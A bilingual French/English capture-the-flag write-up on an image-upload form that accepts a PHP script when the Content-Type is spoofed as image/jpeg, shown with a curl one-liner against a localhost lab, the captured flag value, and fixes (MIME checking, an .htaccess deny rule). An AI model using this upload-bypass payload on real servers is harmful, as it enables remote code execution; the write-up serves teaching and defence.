# Reproduction :  
En cliquant sur ADD IMAGE, on arrive sur un formulaire pour uploader une image.  
Nous envoyons un script une première fois, pour observer la requête POST, qui nous renvoie d'ailleurs un code 200 même si "l'image" n'est pas uploadée.  

Nous essayons maintenant d'envoyer ce même script en manipulant le Content-Type pour tromper le serveur, soit via Postman ou dans une requête curl :  

```sh
echo '<?php echo file_get_contents('/home'); ?>
<?php print "hello"; ?>' > /tmp/script.php  && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/script.php;type=image/jpeg" "http://localhost:8000/index.php?page=upload" | grep flag
```

Cette requête force le serveur à accepter le script PHP en tant qu'image.
En exécutant le script, nous récupérons le flag :  
`46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`  

# Problème :  
L'application ne valide pas correctement le type de fichier uploadé. Cela permet à un attaquant de contourner les restrictions et d'exécuter des scripts malveillants directement sur le serveur, créant une faille de type Remote Code Execution (RCE).  

# Solutions :  
Validation stricte côté serveur :  

1. Vérifiez le type MIME réel des fichiers uploadés et non seulement le Content-Type déclaré par le client :  

```php
$allowedTypes = ['image/jpeg', 'image/png'];
$fileType = mime_content_type($_FILES['uploaded']['tmp_name']);
if (!in_array($fileType, $allowedTypes)) {
    die("Invalid file type.");
}
```

2. On peut aussi empêcher l'exécution de tout fichier dans le répertoire des uploads en configurant un fichier .htaccess :  

```php
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    Deny from all
</FilesMatch>
```

----------------------
----------------------
----------------------
----------------------

# Reproduction:  
By clicking on ADD IMAGE, we arrive at a form to upload an image.  
We first send a script to observe the POST request, which returns a 200 even if the "image" is not uploaded.  

Now we try to send the same script by manipulating the Content-Type to trick the server, either via Postman or in a curl request:  

```sh
echo '<?php echo file_get_contents('/home'); ?>
<?php print "hello"; ?>' > /tmp/script.php  && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/script.php;type=image/jpeg" "http://localhost:8000/index.php?page=upload" | grep flag
```

This request forces the server to accept the PHP script as an image. By executing the script, we retrieve the flag:  
`46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`  

# Problem:  
The application does not properly validate the uploaded file type. This allows an attacker to bypass restrictions and execute malicious scripts directly on the server, creating a Remote Code Execution (RCE) vulnerability.  

# Solutions:  
Strict server-side validation:  

1. Verify the actual MIME type of uploaded files, not just the Content-Type declared by the client:  

```php
$allowedTypes = ['image/jpeg', 'image/png'];
$fileType = mime_content_type($_FILES['uploaded']['tmp_name']);
if (!in_array($fileType, $allowedTypes)) {
    die("Invalid file type.");
}
```

2. Prevent execution of any files in the upload directory by configuring a .htaccess file:  

```php
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    Deny from all
</FilesMatch>
```